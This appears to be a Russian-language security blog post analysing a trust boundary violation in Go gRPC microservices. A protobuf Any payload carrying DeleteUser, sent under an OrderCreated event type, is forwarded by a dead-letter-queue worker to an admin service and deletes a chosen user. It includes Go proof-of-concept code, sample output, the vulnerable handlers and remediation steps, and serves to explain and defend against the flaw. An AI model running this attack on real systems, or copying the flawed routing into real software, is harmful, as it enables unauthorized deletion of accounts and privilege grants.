# Trust Boundary Violation in gRPC gateways

Наткнулся на интересный кейс про Trust Boundary Violation. Микросервисы написаны на Golang. Примеры кода немного изменены.

## Описание

Изначально микросервисов крутятся много, но нас интересуют только **Gateway**, **AdminService**, **DeadLetterQueue** и **OrderService**, данные передаются по gRPC.

Пример Proto-схемы:
```
syntax = "proto3";

// корень проблемы
message EventEnvelope {
    string event_id = 1;
    string event_type = 2;           // логический тип события
    google.protobuf.Any payload = 3; // фактический тип — может быть любым
}

// Cобытие заказа
message OrderCreated {
    string order_id = 1;
    string user_id = 2;
    double amount = 3;
    string currency = 4;
}

// Админ-событие
message DeleteUser {
    string user_id = 1;
    string reason = 2;
}

message GrantAdminRole {
    string target_user_id = 1;
    string role = 2;
}

// Ответ
message EventResponse {
    bool success = 1;
    string message = 2;
}
```

`EventEnvelope` с `google.protobuf.Any` — это общая схема из корпоративного protobuf-репозитория. Её используют 50 микросервисов. Поменять её нельзя, иначе всё сломается.

## Атака

1. Берем юзера который существует в системе.
2. Создаем `payloadAny` с нашим юзером и с ивентом на удаления `events.DeleteUser`
3. Создаем `maliciousEnvelope` но в нем указываем `EventType: "OrderCreated"`, а в `Payload` добавляем нашего юзера для удаления.
4. Дальше все маршалим в `rawBytes` и отправляем.

Пример

```go

import (
    "log"
    "fmt"

    pb "type_confusion/generated"

    "google.golang.org/protobuf/proto"
    "google.golang.org/protobuf/types/known/anypb"
)

victimUserId := "user-67890" // Любой существующий пользователь

deleteUser := &pb.DeleteUser{
    UserId: victimUserId,
    Reason: "Account compromised — security measure", // Пишем любую причину
}

payloadAny, err := anypb.New(deleteUser)
if err != nil {
    log.Fatalf("Failed to pack: %v", err)
}

maliciousEnvelope := &pb.EventEnvelope{
    EventId:   "evt-malicious-001",
    EventType: "OrderCreated",
    Payload:   payloadAny,
}

rawBytes, err := proto.Marshal(maliciousEnvelope)
if err != nil {
    log.Fatalf("Failed to marshal: %v", err)
}

fmt.Printf("Target user: %s\n", victimUserId)
fmt.Printf("event_type: %s\n", maliciousEnvelope.EventType)
fmt.Printf("payload.@type: %s\n", payloadAny.TypeUrl)
fmt.Println("Sending to Gateway...")

response, err := gateway.ProcessEvent(rawBytes)
if err != nil {
    fmt.Printf("Gateway error: %v\n", err)
} else {
    fmt.Printf("Response: success=%v, message=%s\n", response.Success, response.Message)
}
```

И нам выводится в консоль:

```
Target user: user-67890
event_type: OrderCreated
payload.@type: type.googleapis.com/events.DeleteUser
Sending to Gateway...
Response: success=true, message=User user-67890 deleted
```

Никаких ошибок не произошло, юзер успешно удалился, хотя мы создавали ивент `OrderCreated`, интересно почему.

## Разбор

1. В `maliciousEnvelope` находятся данные которые передаются дальше:
```
(*maliciousEnvelope).EventId = evt-malicious-001"
(*maliciousEnvelope).EventType = "OrderCreated"
(*maliciousEnvelope).Payload = [
	(*(*maliciousEnvelope).Payload).TypeUrl = "type.googleapis.com/events.DeleteUser"
	...
]
```

Из `maliciousEnvelope` в `rawBytes` сериализуем protobuf-сообщение в бинарном формате и отправляется в сервис **Gateway** в `ProcessEvent`.

2. Давайте заглянем в **Gateway** и найдем `ProcessEvent`.

```go
func (g *GatewayWithDLQ) ProcessEvent(rawBytes []byte) (*pb.EventResponse, error) {
    envelope := &pb.EventEnvelope{}
    if err := proto.Unmarshal(rawBytes, envelope); err != nil {
        return nil, fmt.Errorf("failed to unmarshal: %w", err)
    }

    var response *pb.EventResponse
    var err error

    switch envelope.EventType {
    case "OrderCreated":
        response, err = g.orderService.HandleOrderCreated(envelope) // <-- Проваливаемся сюда
    case "DeleteUser":
        response, err = g.adminService.HandleDeleteUser(envelope)
    default:
        return nil, fmt.Errorf("failed EventType: %s", envelope.EventType)
    }

    // Передаём в DLQ Worker для переобработки
    if err != nil || !response.Success {
        log.Printf("[Gateway] OrderService failed, forwarding to DLQ Worker")
        return g.dlqWorker.ReprocessEvent(envelope)
    }

    return response, nil
}
```

Тут все верно, поскольку у нас `EventType = OrderCreated` мы проваливаемся в сервис **OrderService** в `HandleOrderCreated`.

3. Давайте заглянем в **OrderService** и найдем `HandleOrderCreated`

```go
func (s *OrderService) HandleOrderCreated(envelope *pb.EventEnvelope) (*pb.EventResponse, error) {
    order := &pb.OrderCreated{}
    if err := envelope.Payload.UnmarshalTo(order); err != nil {
        log.Printf("[OrderService] ERROR: %v — sending to DLQ", err)
        return &pb.EventResponse{
            Success: false,
            Message: fmt.Sprintf("payload error, sent to DLQ: %v", err),
        }, err // <-- событие не потеряно, оно попадёт в DLQ
    }

    log.Printf("[OrderService] Processing order: %s for user %s", order.OrderId, order.UserId)
    return &pb.EventResponse{
        Success: true,
        Message: fmt.Sprintf("Order %s processed", order.OrderId),
    }, nil
}
```

Вот тут мы ловим ошибку `"mismatched message type: got \"events.OrderCreated\", want \"events.DeleteUser\""`. Но когда мы передаем ошибку выше, у нас событие легитимное, то мы помещаем его в **DeadLetterQueue** для повторной отправки.

4. Давайте заглянем в **DeadLetterQueue** в функцию `ReprocessEvent` которая повторно отправляет ивент.

```go
func (w *DLQWorker) ReprocessEvent(envelope *pb.EventEnvelope) (*pb.EventResponse, error) {
    payload := envelope.Payload
    log.Printf("[DLQ Worker] Trying to reprocess event: id=%s, original_type=%s, payload_type=%s",
        envelope.EventId, envelope.EventType, payload.TypeUrl)

    // Пробуем OrderCreated (изначальный тип)
    orderEvent := &pb.OrderCreated{}
    if payload.MessageIs(orderEvent) {
        if err := payload.UnmarshalTo(orderEvent); err == nil {
            log.Printf("[DLQ Worker] Recognized as OrderCreated, forwarding to OrderService")
            return w.orderService.HandleOrderCreated(envelope)
        }
    }

    // Пробуем DeleteUser
    deleteEvent := &pb.DeleteUser{}
    if payload.MessageIs(deleteEvent) {
        if err := payload.UnmarshalTo(deleteEvent); err == nil {
            log.Printf("[DLQ Worker] Recognized as DeleteUser, forwarding to AdminService")
            return w.adminService.HandleDeleteUser(envelope)
        }
    }

    // Пробуем GrantAdminRole
    grantEvent := &pb.GrantAdminRole{}
    if payload.MessageIs(grantEvent) {
        if err := payload.UnmarshalTo(grantEvent); err == nil {
            log.Printf("[DLQ Worker] Recognized as GrantAdminRole, forwarding to AdminService")
            return w.adminService.HandleGrantAdminRole(envelope)
        }
    }

    // Ничего не подошло — отправляем в "мёртвый" архив
    return &pb.EventResponse{
        Success: false,
        Message: fmt.Sprintf("unrecognized payload type: %s", payload.TypeUrl),
    }, nil
}
```

Здесь мы видим что сервис работает только с `payload`, и пробует отправить в разные сервисы события. Поскольку в `payload` у нас удаление пользователя, то успешно выполняется `payload.MessageIs(deleteEvent)` и ивент на удаление отправляется в **AdminService**.

## Итог

У нас есть цепочка из 4 сервисов:

```
Gateway → OrderService → DeadLetterQueue → AdminService
```

**OrderService** неявно очищает данные самим фактом своего существования. **DLQ Worker** считает: "раз событие прошло через **OrderService**, значит оно легитимно". Но **OrderService** не проверял `payload.@type`, он проверил только строку `event_type` и упал на распаковке.
**DLQ Worker** находится внутри доверенного периметра и не ожидает атаки. Он принимает данные от **OrderService** как от доверенного источника, но эти данные не были очищены.

```
[ВНЕШНИЙ ПЕРИМЕТР]
      │
   Gateway <- проверяет event_type (строка), маршрутизирует
      │
   OrderService <- пытается распаковать, падает, передаёт в DLQ
      │
══════════════ НАРУШЕНИЕ ГРАНИЦЫ ДОВЕРИЯ ══════════════
      │
[ВНУТРЕННИЙ ПЕРИМЕТР]
      │
   DLQ Worker  ← доверяет данным от OrderService, перебирает типы
      │
   AdminService ← выполняет DeleteUser без проверки источника
```

**OrderService** выступает точкой перехода через границу доверия, но не выполняет полную санитизацию. Внутренний **DLQ Worker** обрабатывает непроверенный `Any` как легитимный ввод, что позволяет атакующему исполнить произвольную операцию в **AdminService**. **Gateway** и **OrderService** должны санировать данные при переходе границы доверия. Они этого не делают — и атака проходит через всю цепочку.

### Что необходимо сделать:

1. **Gateway** - Валидировать и `event_type`, и `payload.@type`. Единственная точка входа извне — здесь граница доверия
2. **OrderService** - Убрать передачу в **DLQ** при ошибке распаковки. Ошибка валидации = отклонять событие, а не "помогать"
3. **DLQ Worker** - Принимать только от доверенных отправителей + проверять `payload.@type` строго по белому списку. Защита от внутренних атак
